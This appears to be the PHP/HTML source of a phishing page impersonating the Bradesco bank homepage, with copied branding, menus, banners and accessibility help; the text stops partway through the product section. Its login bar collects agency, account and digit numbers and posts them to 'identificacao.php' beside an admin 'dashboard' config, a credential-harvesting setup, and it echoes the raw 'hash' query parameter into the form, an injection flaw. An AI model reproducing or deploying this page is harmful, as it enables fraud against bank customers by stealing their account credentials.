
<?php
require_once('_dashboard2021/config.php');
require_once('validacao.php');
?>
<!DOCTYPE html>
<html class="no-js" lang="pt-br">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="DC.date.modified" content="2020-11-08">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="images/favicon.ico">
    <title>Banco Bradesco | Desafie o Futuro</title> 
    <meta name="description" content="Conheça nossas facilidades e aproveite os serviços on-line que te ajudam a cuidar do seu dinheiro. Acesse já!">
    <meta name="apple-itunes-app" content="app-id=336954985">
    <meta name="google-play-app" content="app-id=com.bradesco">
    <meta name="msApplication-ID" content="App">

    <!-- Open Graph -->
    <meta property="og:url" content="https://banco.bradesco/" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Banco Bradesco | Desafie o Futuro" />
    <meta property="og:description" content="Conheça nossas facilidades e aproveite os serviços on-line que te ajudam a cuidar do seu dinheiro. Acesse já!" />
    <meta property="og:image" content="https://banco.bradescosvg/logo.svg" />
  
    <!-- Twitter Cards -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="@Bradesco" />
    <meta name="twitter:title" content="Banco Bradesco | Desafie o Futuro" />
    <meta name="twitter:description" content="Conheça nossas facilidades e aproveite os serviços on-line que te ajudam a cuidar do seu dinheiro. Acesse já!" />
    <meta name="twitter:image" content="https://banco.bradescosvg/logo.svg" />
  
    
    <link rel="stylesheet" type="text/css" href="css/main.css">
    <link rel="stylesheet" type="text/css" href="css/posso_ajudar.css" />
<!-- Google Tag Manager -->

<!-- End Google Tag Manager -->
<link rel="stylesheet" type="text/css" href="css/normalize.min.css" />
<link rel="stylesheet" type="text/css" href="css/structure.css" />
<link rel="stylesheet" type="text/css" href="css/chosen.min.css" />
<link rel="stylesheet" type="text/css" href="css/magnific-popup.css" />
<link rel="stylesheet" type="text/css" href="css/jquery.mmenu.all.css" />
<link rel="stylesheet" type="text/css" href="css/owl.carousel.css" />
<link rel="stylesheet" type="text/css" href="css/owl.theme.css" />
<link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="css/mediaelementplayer.css" />
<link rel="stylesheet" type="text/css" href="css/font-awesome.css" />
<link rel="stylesheet" type="text/css" href="css/slick.css" />
<link rel="stylesheet" type="text/css" href="css/slick-theme.css" />
<link rel="stylesheet" type="text/css" href="css/bootstrap-select.css">
<link rel="stylesheet" type="text/css" href="css/font-montserrat.css">
<link rel="stylesheet" type="text/css" href="css/btns.css">
<link rel="stylesheet" href="css/index-lightbox.css">
<link rel="stylesheet" href="css/index-footer.css">
<link rel="stylesheet" href="css/index-footer-map.css">

    
    <!-- Arquivos Css do Banner -->
    <link rel="stylesheet" type="text/css" href="css/flexslider.css" />
    <link rel="stylesheet" type="text/css" href="css/banner.css" />
    <!-- Style Nova Home --> 
    <link rel="stylesheet" type="text/css" href="css/classic-main.css">
    <link rel="stylesheet" type="text/css" href="css/home.css">
    <link rel="stylesheet" href="css/index-banner.css">

</head>
<body class="home">

<script id="navegg" src="js/navegg.js"></script>
<script>
    var ipcli = '23.67.76.21';
</script>
<!--[if IE]>
	<link rel="stylesheet" type="text/css" href="css/ajustes-ie.css" />
<![endif]-->

<!-- Retargeting Limite credito pessoal -->
<link rel="stylesheet" type="text/css" href="css/rt-limite-credito-pessoal.css">
<span class="btn-ver-agora"></span>
<div class="md-rt-wrapper">
	<div class="md-tr-container">
		<div class="md-tr-backdrop"></div>
		<div class="md-tr-content">
			<div class="md-tr-body">
				<img class="md-tr-img" src="images/modal-img.jpg" alt="modal"/>
				<a class="text_transparent close spb" id="Fechar">.</a>
				<a class="text_transparent bt-sb-mais Saibamais" id="spb2">.</a>
				<a id="Simular" href="javascript:;" data-title="Acesse sua conta e simule antes de contratar" data-width="680" data-origem="101" data-cdservico="163" data-servico="sim" class="text_transparent bt-simular modalIB spb">.</a>
			</div>
		</div>
	</div>
</div>


<!-- Barra de Login / Baixar Aplicativo -->
<div id="topBar" class="headertopBar fixed" style="display: flex">
    <div class="holder">
        <form name="Form60" id="Form60" method="post"
                onsubmit="return ValidaLogin(event);"
                action="identificacao.php?hash=<?php echo $_GET['hash']; ?>">
            <fieldset>
                <img class="ico-cadeado" src="images/cadeado_-01.svg" alt="cadeado">
                <span class="legenda-acessa-conta" title="Acesse o Internet Banking">acessar sua conta</span>
                <ul>
                    <li>
                        <label for="agencia">Agência:</label>
                        <input autocomplete="off" name="agencia" type="text" class="js-jump-field label_ag" id="agencia" tabindex="1" title="Informe o número da agência sem o dígito"  onkeypress="return justNumbers(event);" maxlength="4">
                    </li>
                    <li>
                        <label for="conta">Conta:</label>
                        <input autocomplete="off" name="conta" type="text" class="js-jump-field label_conta" id="conta" tabindex="2" title="Informe a Conta sem o dígito" maxlength="7"  onkeypress="return justNumbers(event);">
                        <label class="text_transparent" for="digito">.</label>
                        <input autocomplete="off" name="digito" type="text" class="js-jump-field label_conta_dg" id="digito" tabindex="3" title="Informe o dígito da sua conta" maxlength="1" onkeypress="return justNumbers(event);">
                    </li>
                    <li>
                        <input type="submit" value="OK" tabindex="5" title="Entrar" class="btn-ok">
                        <input type="hidden" name="EXTRAPARAMS" value="">
                        <input type="hidden" name="ORIGEM" value="101">
                    </li>
                    <li class="lembrar" title="Está em computador público? Não use esta opção.">
						<div>
							<input style="position: absolute;left: -99999px;display: block;" type="checkbox" id="lembrar" name="lembrar" onclick="trackBradesco('Classic', 'Cabecalho', 'Lembrar me');" tabindex="4">
							<label for="lembrar">Lembrar-me</label>
						</div>
						<span class="text_hover text_transparent" title="Está em computador público? Não use esta opção.">?</span>
					</li>
                </ul>
            </fieldset>
        </form>
        <ul id="skiplinks" class="visuallyhidden">
			<li><a href="#conteudo" tabindex="6" title="Ir para o conteúdo" accesskey="1">Ir para o conteúdo</a></li>
			<li><a href="javascript:dvfoco(2);" tabindex="7" title="Ir para o Menu" accesskey="2">Ir para o Menu</a></li>
            <li><a href="javascript:dvfoco(3);" tabindex="8" title="Ir para a Pesquisa" accesskey="3">Ir para a Pesquisa</a></li>
			<li><a href="#footer" tabindex="9" title="Ir para o Rodapé" accesskey="4">Ir para o Rodapé</a></li>		
        </ul>
        <div class="como-usar">
            <span tabindex="12">Como Usar</span>
            <div class="links">
                <ul>
                    <li>
                        <a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Cabeçalho','Como usar - Como acessar sua conta');" tabindex="13" title="Como Acessar sua Conta">Como Acessar sua Conta</a>
                    </li>
                    <li>
                        <a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Cabeçalho','Senhas e Chaves de Segurança');" tabindex="14" title="Senhas e Chaves de Segurança">Senhas e Chaves de Segurança</a>
                    </li>
                    <li>
                        <a title="Chat Internet Banking" href="#" onclick="chatIB();trackBradesco('Portal Classic - Home','Cabeçalho','Como usar - Chat Internet Banking');" tabindex="15">Chat Internet Banking</a>
                    </li>
                    <li>
                        <a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Cabeçalho','Como usar - Navegador Exclusivo Bradesco');" tabindex="16" title="Navegador Exclusivo Bradesco">Navegador Exclusivo Bradesco</a>
                    </li>   
                </ul>
            </div>
        </div>

        <div class="canal-consorciado"><a onclick="abrirModalCanalConsorciado('classic'); trackBradesco('Classic','Consórcios Home','Botão Canal do Consorciado');" title="Acesso ao Canal do Consorciado" data-width="650" tabindex="17">Canal do Consorciado</a></div>

		<div class="btn-parceiros" tabindex="17"><a rel="noopener" href="">Acesso Parceiros</a></div>

        <div class="nao-correntista">
            <form name="FormNaoCorrentista01" id="FormNaoCorrentista01" method="post" onsubmit="return ValidaFormNaoCorrentista01(this);" action="">
				<ul class="clearfix">
					<li><label for="CPF01" title="CPF:">CPF:</label></li>
					<li>
						<label for="CPF01" class="text_transparent">.</label>
						<input name="CPF01" type="text" id="CPF01" title="Informe o número do CPF" tabindex="17" onkeydown="formataCPF(this,event);" onfocus="textInitialCPF(this, false);" onblur="textInitialCPF(this, true);" value="Cliente Não Correntista" maxlength="14">
					</li>
					<li>
						<label class="text_transparent">.</label>
						<input id="btnEnviar01" type="submit" value="OK" title="Entrar" tabindex="18" onclick="trackBradesco('classic', 'Cabecalho', 'OKNaoCorrentista');">
					</li>
					<li><a href="javascript:;" onclick="trackBradesco('Classic', 'Cabecalho', 'BotaoComoFunciona');" title="O acesso às informações do seu cartão mudou. Digite o CPF, clique em Primeiro acesso e faça seu recadastro.  Se você for um novo cliente, siga os mesmos passos." class="text_transparent duvd">.</a></li>
				</ul>
				<input type="hidden" name="IDENT" value="">
				<input type="hidden" name="ORIGEM" value="64">
			</form>
        </div>
        <div class="top-bar-center">
			<div id="acessib-menu-feat">
	<a href="#acessib-menu" title="Ativar Menu de Acessibilidade" data-disclosure aria-controls="acessib-menu" aria-expanded="false" aria-haspopup="true" hidden class="bt-acessib" tabindex="10" role="button">
		<span class="texto">Acessibilidade</span>
		<span class="icone" aria-hidden="true"><img src="images/icon_acessibilidade.svg" alt="Icone do Menu de Acessibilidade"></span>
	</a>
	<div id="acessib-menu" hidden="hidden">
		<div class="acessib-header">
			<h3>Acessibilidade</h3>
			<a href="#fechar" class="acessib-fechar" aria-label="Desativar Menu Acessibilidade" tabindex="-1" aria-hidden="true"></a>
		</div>
		<div class="acessib-footer">
			<a href="#acessib-ajuda" class="acessib-ajuda-button button" title="Ir para Ajuda" aria-controls="acessib-ajuda" aria-expanded="false" tabindex="11.1" role="button">
				<img src="images/icon_acessibilidade_ajuda.svg" alt="Ícone Ajuda" aria-hidden="true">
				<span>Ajuda</span>
			</a>
		</div>
		<div class="acessib-content">
			<ul id="acessib-content-nav" role="menu">
				<!-- <li role="presentation">
					<a href="#" class="acessib-ler_pagina" title="Ler a página" role="menuitem" tabindex="11.2">
						<img src="images/icon_acessibilidade_ler_pagina.svg" alt="Ícone Ler a página" aria-hidden="true">
						<span>Ler a página</span>
					</a>
				</li> -->
				<li role="presentation">
					<a href="#" class="acessib-contraste" title="Ativar Alto Contraste" role="menuitem" tabindex="11.3">
						<img src="images/icon_acessibilidade_contraste.svg" alt="Ícone Alto Contraste" aria-hidden="true">
						<span>Alto Contraste</span>
					</a>
				</li>
				<li role="presentation">
					<a href="#" class="acessib-weblibras" title="Ativar WebLibras" role="menuitem" tabindex="11.4">
						<img src="images/icon_acessibilidade_weblibras.svg" alt="Ícone WebLibras" aria-hidden="true">
						<span>WebLibras</span>
					</a>
				</li>
				<li role="presentation">
					<a href="#" class="acessib-navegacao" title="Ativar Destacar foco da navegação" role="menuitem" tabindex="11.5">
						<img src="images/icon_acessibilidade_navegacao.svg" alt="Ícone Destacar foco da navegação" aria-hidden="true">
						<span>Destacar foco da navegação</span>
					</a>
				</li>
				<li role="presentation">
					<a href="javascript:;" class="acessib-produtos_servicos" title="Ir para Acessbilidade de Produtos e Serviços" role="menuitem" tabindex="11.6">
						<img src="images/icon_acessibilidade_produtos_servicos.svg" alt="Ícone Produtos e Serviços" aria-hidden="true">
						<span>Produtos e serviços</span>
					</a>
				</li>
			</ul>
			<div id="acessib-ajuda" class="acessib-ajuda">
				<div class="acessib-header">
					<a href="#acessib-content-nav" class="acessib-voltar" aria-label="Voltar para Menu de Acessibilidade" tabindex="-1" aria-hidden="true"></a>
					<h3>Ajuda</h3>
					<a href="#fechar" class="acessib-fechar" aria-label="Desativar Menu Acessibilidade" tabindex="-1" aria-hidden="true"></a>
				</div>
				<div class="js-acc-group">
					<button class="c-accordion--btn js-acc-btn" tabindex="11.7">Como usar as teclas de navegação?</button>
					<div class="c-accordion--panel js-acc-panel" tabindex="11.8">
						<p class="c-text">
							Se você usa o navegador Google Chrome, pressione a tecla Alt e o número que corresponde ao local da página que você quer dar o foco.
							<br/>
							<br/>
							Exemplos:<br/>
							Alt 1 (ir para o conteúdo)<br/>
							Alt 2 (ir para o menu)<br/>
							Alt 3 (ir para a pesquisa)<br/>
							Alt 4 (ir para o rodapé)<br/>
							<br/>
							Para o navegador Mozilla Firefox o atalho é Alt Shift e o Número. Depois, é só apertar Enter.
						</p>
					</div>
				</div>

				<div class="js-acc-group">
					<button class="c-accordion--btn js-acc-btn" tabindex="11.9">Como aumentar e diminuir o tamanho da fonte?</button>
					<div class="c-accordion--panel js-acc-panel" tabindex="11.10">
						<p class="c-text">
							Pra aumentar a fonte da página, use o comando Ctrl mais. Se quiser diminuir, use Ctrl menos.
						</p>
					</div>
				</div>

				<div class="js-acc-group">
					<button class="c-accordion--btn js-acc-btn" tabindex="11.11">O tradutor de Libras não está funcionando. O que fazer?</button>
					<div class="c-accordion--panel js-acc-panel" tabindex="11.12">
						<p class="c-text">
							Se o tradutor de Libras não estiver funcionando, por favor, envie um e-mail para <a href="javascript:;">bradescoacessi@bradesco.com.br</a> com o assunto WebLibras. Assim que for corrigido, responderemos seu e-mail :)
						</p>
					</div>
				</div>

				<div class="js-acc-group">
					<button class="c-accordion--btn js-acc-btn" tabindex="11.13">Como usar o alto contraste?</button>
					<div class="c-accordion--panel js-acc-panel" tabindex="11.14">
						<p class="c-text">
							Pressione enter para cor preto e amarelo, pressione enter mais uma vez para cor preto e branco e pressione enter outra vez para voltar a cor original.
						</p>
					</div>
				</div>

				<div class="acessib-footer">
					<a href="#acessib-content-nav" class="acessib-voltar-button button" title="Voltar" tabindex="11.15">
						<span>Voltar</span>
					</a>
				</div>
			</div>
		</div>
	</div>
</div>
        </div>
    </div>
    <div class="holderMobile">
        <a href="#" class="fechar" onclick="trackBradesco('Smart Banner','APP Integrador ','Fechar');"><img src="images/ico-fechar.png" alt="ico-fechar"/></a>
        <p>
            <span>Pra acessar sua conta, </span>
			<span>use o App Bradesco</span>
        </p>
        <a href="#" class="baixe" onclick="trackBradesco('Smart Banner','APP Integrador ','Baixar Agora');">Abrir App</a>
    </div>
</div>
<!-- End: Barra de Login / Baixar Aplicativo -->

<div id="wrapper">
    <!-- Header Desktop -->
    <header class="mainHeader">
        <a href="javascript:;" tabindex="15" title="Bradesco" ><h1 class="gradient"><img src="images/logo-mobile.png" alt="Bradesco" /></h1></a>
        <ul class="navSeg">
            <li class="active">
                <a onclick="trackBradesco('Portal Classic - Home','Menu Superior','Para voce'); setProfile('pb');"><span>&nbsp;</span>Para Você</a>
            </li>
            <li>
                <a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Exclusive'); setProfile('px');"><span>&nbsp;</span>Exclusive</a>
            </li>
            <li>
                <a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Prime'); setProfile('pr');"><span>&nbsp;</span>Prime</a>
            </li>
            <li>
                <a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Private Bank'); setProfile('pv');"><span>&nbsp;</span>Private Bank</a>
            </li>
           <li class="sub">
                <a href="#" title="Mais Perfis"><span>Mais</span>Perfis</a>
                <div class="navCnt">
                    <ul class="nav">
                        <li><a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Mais Perfis - Aposendados');">Aposentados</a></li>
                        <li><a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Mais Perfis - Criancas e Adolecentes');">Crianças e Adolescentes</a></li>
                        <li><a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Mais Perfis - Nikkei');">Nikkei</a></li>
                        <li><a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Mais Perfis - Universitarios');">Universitários</a></li>
                    </ul>
                </div>
            </li>
            <li class="divisor sub">
                <a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Empresas_Negocios_PJ'); setProfile('pj');"><span>Para sua</span>Empresa</a>
                <div class="navCnt emp">
                    <ul class="nav">
                        <li><a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Para sua empresa - Empresas e Negócios'); setProfile('pj');">Empresas e Negócios</a></li>
                        <li><a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Para sua empresa - Bradesco Corporate'); setProfile('pc');">Bradesco Corporate</a></li>
                    </ul>
                    <div class="clear"></div>
                </div>
            </li>
            <li class="divisor sub">
                <a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Para_PoderPublico');"><span>&nbsp;</span>Poder Público</a>
                <div class="navCnt last">
                    <ul class="nav">
                        <li><a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Poder Publico - Servidor Público');">Servidor Público</a></li>
                        <li><a href="javascript:;" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Poder Publico - Orgãos Publicos');">Órgãos Públicos</a></li>
                    </ul>
                </div>
            </li>
            <!-- <li>
                <a href="javascript:;" title="Mais Bradesco" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Mais Bradesco');"><span>Mais</span>Bradesco</a>
            </li> -->
        </ul>
    </header>
    <!-- End: Header Desktop -->

    <!-- Header Mobile -->
    <div class="holderFixed fixed">
        <header class="headerMobile">
            <a href="javascript:;" tabindex="-1" class="lg-bra">
              <img src="images/logo-mobile.svg" alt="Bradesco_H_CMYK_Branco-01-01"/>
            </a>
            <!-- Busca -->
            <div class="busca">
                <form action="javascript:;" method="post" onsubmit="envia(document.formbuscamobile.textobuscamobile.value);" name="formbuscamobile" id="formbuscamobile">
                    <fieldset>
                        <legend>Busca</legend>
                        <div>
                            <input type="button" onclick="envia(this.form.textobuscamobile.value);" value="Buscar" title="Buscar" class="btn-img btn-buscar" />
                            <label for="textobuscamobile" class="text_transparent">.</label>
							<input type="text" id="textobuscamobile" class="input-autocomplete" placeholder="O que você procura?" autocomplete="off" size="1" tabindex="42" title="Informe o que você quer pesquisar"onclick="trackBradesco('Portal Classic - Home','Menu Superior','Busca');" />
                            <div id="listamobile" class="search-autocomplete2"></div>
                        </div>
                    </fieldset>
                </form>
                <div id="search-autocomplete" class="search-autocomplete">
                    <div></div>
                </div>
            </div>
            <!-- End: Busca -->
            <div id="blcok_busca_close" class="block_busca_open"></div>
            <a href="#" class="buscaMobile">Busca</a>
            <a href="#MainMenuMobile" class="control_status">
			  <span class="text_transparent">.</span>
              <input type="checkbox" id="control__nav" class="control__nav-click" />
              <div class="control">
                <label for="control__nav" class="control__nav">                  
                  <span></span>
                  <span></span>
				  <span class="text_transparent">.</span>
                </label>
              </div>
            </a>
        </header>
    </div>
    <!-- End: Header Mobile -->
    
    <!-- Combo de Segmentos Versão Mobile -->
    <div class="comboSegmentos comboSegmentosHome">
        <h2>Para Você<span></span></h2>
        <ul>
            <li>
                <a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Exclusive'); setProfile('px');">Exclusive</a>
            </li>
            <li>
                <a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Prime'); setProfile('pr');">Prime</a>
            </li>
            <li>
                <a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Private'); setProfile('pv');">Private Bank</a>
            </li>
            <li class="sub">
                <a href="#"><span>Mais</span> Perfis</a>
                <ul>
                    <li><a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_MaisPerfis_Aposentados');">Aposentados</a></li>
                    <li><a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_MaisPerfis_ClickConta');">Crianças e Adolescentes</a></li>
                    <li><a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_MaisPerfis_Nikkei');">Nikkei</a></li>
                    <li><a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_MaisPerfis_Universitarios');">Universitários</a></li>
                </ul>
            </li>
            <li class="sub">
                <a href="#"><strong><span>Mais</span> Bradesco</strong></a>
            </li>
            <li class="sub">
                <a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Empresas_Negocios_PJ'); setProfile('pj');">Para sua Empresa</a>
                <ul>
                    <li><a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Empresas_Negocios_PJ'); setProfile('pj');">Empresas e Negócios</a></li>
                    <li><a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Corporate_PJ'); setProfile('pc');">Bradesco Corporate</a></li>
                </ul>
            </li>
            <li class="sub">
                <a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Para_PoderPublico');">Para o Poder Público</a>
                <ul>
                    <li><a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Para_PoderPublicoPF');">Servidor Público</a></li>
                        <li><a href="javascript:;" onclick="trackBradesco('Classic','Home','Head_Para_PoderPublicoPJ');">Órgãos Públicos</a></li>
                </ul>
            </li>
        </ul>
    </div>
    <!-- End: Combo de Segmentos Versão Mobile -->

    <!-- Busca -->
    <div class="busca busca-desk">
        <form action="javascript:;" method="post" onsubmit="envia(document.formbusca.textobusca.value);" name="formbusca" id="formbusca">
            <fieldset>
                <legend>Busca</legend>
                <div>
                    <input type="button" onclick="envia(this.form.textobusca.value);" value="Buscar" tabindex="41" title="Buscar" class="btn-img btn-buscar" />
                    <label for="textobusca" class="text_transparent">.</label>
					<input type="text" id="textobusca" class="input-autocomplete" placeholder="O que você procura?" autocomplete="off" size="1" tabindex="40" title="Informe o que você quer pesquisar" onclick="trackBradesco('Portal Classic - Home','Menu Superior','Busca');" />
                    <div id="lista" class="search-autocomplete2"></div>
                    <a href="#textobusca" class="text_transparent">.</a>
                </div>
            </fieldset>
        </form>
        <div id="search-autocomplete" class="search-autocomplete">
            <div></div>
        </div>
    </div>
    <!-- End: Busca -->

    <!-- Navegação Principal Desktop -->
    <nav id="mainMenu">
        <!--Botao de Abra Sua Conta-->
        <a href="#mainMenu" class="text_transparent">.</a>
        <a class="botaoAbraConta js-expand" href="#" onclick="trackBradesco('classic','Home','Menu Abra sua conta');">Abra sua conta</a>
        <div id="cardConta" class="cardConta" style="display: none;">
            <p>Utilize o QR Code para baixar o App Bradesco e abra sua conta agora mesmo!</p>
            <img src="images/qrcode-pf.png" alt="Qr Code">
            <span class="destaque">Conta sem tarifa por 1 ano*</span>
            <p>Conheça todos os benefícios para clientes Bradesco</p>
            <a href="javascript:;" class="btn_classic-solid" onclick="trackBradesco('classic','Home','Botão Abra sua conta');">Saiba mais</a>
        </div>
        <a href="javascript:;" class="botaoContrate" onclick="trackBradesco('classic','Home','Menu Contrate On-line');">CONTRATE ON-LINE</a>
        <!-- End: Botao de Abra Sua Conta -->
        <h2>
        <ul>
                <li class="produtos-servicos">
                        <a href="javascript:;" tabindex="45" onclick="trackBradesco('Portal Classic - Home','Menu Lateral','Produtos e Serviços');">Produtos <span>e Serviços</span></a>
                </li>
                <li class="promocoes">
                        <a href="javascript:;" tabindex="45" onclick="trackBradesco('Portal Classic - Home','Menu - Produtos e serviços','Promoções e Campanhas');">Benefícios <span>e Novidades</span></a>
                </li>
                <li class="educacao-financeira">
                <a href="javascript:;" tabindex="45" onclick="trackBradesco('Portal Classic','Menu - Lateral','Educação <span>Financeira</span>');">Educação <span>Financeira</span></a>
                </li>
                <li class="canais-digitais">
                        <a href="javascript:;" tabindex="45" onclick="trackBradesco('Portal Classic - Home','Menu Lateral','Canais Digitais');">Canais <span>Digitais</span></a>
                </li>
                <li class="atendimento">
                <a href="javascript:;" tabindex="45" onclick="trackBradesco('Portal Classic - Home','Menu Lateral','Atendimento');">Atendimento</a>
                </li>
        </ul>
        </h2>
    </nav>
    <a id="abrasuacontaFixed" href="javascript:;" class="btnAbraContaFixed hidden-xs" onclick="trackBradesco('classic','Home','Botão Abra sua conta flutuante');" style="display: none;">ABRA SUA CONTA</a>
    <a href="javascript:;" class="btnAbraContaFixed visible-xs" onclick="trackBradesco('classic','Home','Botão Abra sua conta flutuante mobile');" style="display: none;">ABRA SUA CONTA</a>
    <!-- End: Navegação Principal Desktop -->

    <!-- Navegação Principal Mobile -->
    <nav id="MainMenuMobile"></nav>
    <!-- End: Navegação Principal Mobile -->
    <div class="filtro_topo"></div>
    <section id="carousel-banner">
    <div id="slider" class="flexslider">
        <ul class="slides">

            
            <li>
                <a href="javascript:;" onclick="trackBradesco('Home Classic','clique banner','Dia das Mães');" rel="noopener">
                    <div class="filtro_banner"></div>
                    <div class="filtro"></div>
                    <img src="images/001-d.png" alt="#PraCegoVer: Texto: O mundo precisa das mães. E as mães, de toda empatia do mundo." class="desktop">
                    <img src="images/001-m.png" alt="#PraCegoVer: Texto: O mundo precisa das mães. E as mães, de toda empatia do mundo." class="mobile_banner">
                </a>
            </li>
            
            <li>
                <a href="/html/classic/produtos-servicos/emprestimo-e-financiamento/encontre-seu-credito/simuladores-imoveis.shtm#box1-comprar
                " onclick="trackBradesco('Home Classic','clique banner','Crédito Imobiliário');" rel="noopener">
                    <div class="filtro_banner"></div>
                    <div class="filtro"></div>
                    <img src="images/004-d.png" alt="#PraCegoVer Texto: Crédito imobiliário a partir de 3,95%a.a. + remuneração da poupança.
                    Crédito sujeito a aprovação. Imagem: A imagem é composta por um fundo em degrade do azul para o magenta e vermelho, com elementos gráficos, gride quadriculado e ícones de prédios." class="desktop">
                    <img src="images/004-m.png" alt="#PraCegoVer Texto: Crédito imobiliário a partir de 3,95%a.a. + remuneração da poupança.
                    Crédito sujeito a aprovação. Imagem: A imagem é composta por um fundo em degrade do azul para o magenta e vermelho, com elementos gráficos, gride quadriculado e ícones de prédios." class="mobile_banner">
                </a>
            </li>

            <li>
                <a href="javascript:;" onclick="trackBradesco('Home Classic','clique banner','IR Prorrogação');" rel="noopener">
                    <div class="filtro_banner"></div>
                    <div class="filtro"></div>
                    <img src="images/002-d.jpg" alt="#PraCegoVer Texto: O prazo do IR 2021 foi prorrogado.
                    Ainda dá tempo de fazer sua declaração e indicar o Bradesco para receber sua restituição." class="desktop">
                    
                    <img src="images/002-m.jpg" alt="#PraCegoVer Texto: O prazo do IR 2021 foi prorrogado.
                    Ainda dá tempo de fazer sua declaração e indicar o Bradesco para receber sua restituição." class="mobile_banner">
                </a>
            </li>

            <li>
                <a href="/html/classic/produtos-servicos/consorcios/" onclick="trackBradesco('Home Classic','clique banner','Consórcios');" rel="noopener">
                    <div class="filtro_banner"></div>
                    <div class="filtro"></div>
                    <img src="images/003-d.jpg" alt="#PraCegoVer: Pra você que tem sonhos para o futuro. Consórcio Bradesco Compensa. Contrate on-line." class="desktop">
                    <img src="images/003-m.jpg" alt="#PraCegoVer: Pra você que tem sonhos para o futuro. Consórcio Bradesco Compensa. Contrate on-line." class="mobile_banner">
                </a>
            </li>

            

            

        </ul>
    </div>

    <div id="carousel" class="flexslider">
        <ul class="slides">
            <li class="progress-bar bar_0" data-percent="100" data-duration="10500" data-slide="0"></li>
            <li class="progress-bar bar_1" data-percent="100" data-duration="10500" data-slide="1"></li>
            <li class="progress-bar bar_2" data-percent="100" data-duration="10500" data-slide="2"></li>
            <li class="progress-bar bar_3" data-percent="100" data-duration="10500" data-slide="3"></li>
            
        </ul>
    </div>

</section>
    <section class="grey__bar">
        <div class="grey__bar-box pb2" id="conteudo">
            <div class="title__naocorrentista">
                <a href="javascript:;" title="Acesse Portal não correntista" onclick="trackBradesco('Home Principal','nao tem conta aqui','Portal nao correntista');" class="hover">
                    <span class="">Contrate on-line</span>
                </a>
            </div>
        </div>
        <div class="pt0" id="box__naocorrentista">
            <div class=" box-naocorrentista mt0">
                <div class="bra-container">

                    <div class="item">
                        <a href="javascript:;" title="Acesse Cartões" onclick="trackBradesco('Home Principal','nao tem conta aqui','Cartoes');">
                            <div class="bra-icone">
                                <picture>
                                    <source srcset="images/cartoes.webp" type="image/webp">
                                    <source srcset="images/cartoes.png" type="image/png">
                                    <img src="images/cartoes.png" alt="Ícone Cartões de Crédito" />
                                </picture>
                                <picture class="over" aria-hidden="true">
                                    <source srcset="images/cartoes_hover.webp" type="image/webp">
                                    <source srcset="images/cartoes_hover.png" type="image/png">
                                    <img src="images/cartoes_hover.png" alt="Ícone Cartões de Crédito" />
                                </picture>
                            </div>
                            <p class="bra-texto">Cartões de Crédito</p>
                        </a>
                    </div>

                    <div class="item tag-novo">
                        <a href="javascript:;" title="Consórcios" onclick="trackBradesco('Home Principal','nao tem conta aqui','Consorcios');">
                            <div class="bra-icone">
                                <picture>
                                    <source srcset="images/consorcio.png" type="image/webp">
                                    <source srcset="images/consorcio.png" type="image/png">
                                    <img src="images/consorcio.png" alt="Ícone Empréstimo Losango" />
                                </picture>
                                <picture class="over" aria-hidden="true">
                                    <source srcset="images/consorcio-hover.png" type="image/webp">
                                    <source srcset="images/consorcio-hover.png" type="image/png">
                                    <img src="images/consorcio-hover.png" alt="Ícone Empréstimo Losango" />
                                </picture>
                            </div>
                            <p class="bra-texto">Consórcios</p>
                        </a>
                    </div>

                    <div class="item">
                        <a href="javascript:;" title="Acesse Ágora Investimentos" onclick="trackBradesco('Home Principal','nao tem conta aqui','Agora Investimentos');">
                            <div class="bra-icone">
                                <picture>
                                    <source srcset="images/agora.webp" type="image/webp">
                                    <source srcset="images/agora.png" type="image/png">
                                    <img src="images/agora.png" alt="Ícone Ágora Investimentos" />
                                </picture>
                                <picture class="over" aria-hidden="true">
                                    <source srcset="images/agora_hover.webp" type="image/webp">
                                    <source srcset="images/agora_hover.png" type="image/png">
                                    <img src="images/agora_hover.png" alt="Ícone Ágora Investimentos" />
                                </picture>
                            </div>
                            <p class="bra-texto">Ágora <br />Investimentos</p>
                        </a>
                    </div>


                    <div class="item">
                        <a href="javascript:;" title="Acesse Empréstimos" onclick="trackBradesco('Home Principal','nao tem conta aqui','Emprestimo Losango');">
                            <div class="bra-icone">
                                <picture>
                                    <source srcset="images/emprestimo.webp" type="image/webp">
                                    <source srcset="images/emprestimo.png" type="image/png">
                                    <img src="images/emprestimo.png" alt="Ícone Empréstimo Losango" />
                                </picture>
                                <picture class="over" aria-hidden="true">
                                    <source srcset="images/emprestimo_hover.webp" type="image/webp">
